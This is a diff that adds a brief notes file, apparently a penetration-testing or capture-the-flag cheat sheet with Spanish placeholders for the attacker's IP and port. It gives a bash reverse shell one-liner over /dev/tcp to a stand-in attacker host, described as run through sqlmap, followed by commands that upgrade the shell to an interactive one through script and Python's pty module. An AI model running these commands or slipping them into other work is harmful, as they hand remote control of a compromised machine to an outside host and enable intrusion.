@@ -1,0 +1,6 @@
+# Command to get the reverse shell with sqlmap
+$ bash -c 'bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1'
+
+# Commands to make the reverse shell more interactive
+$ SHELL=/bin/bash script -q /dev/null
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
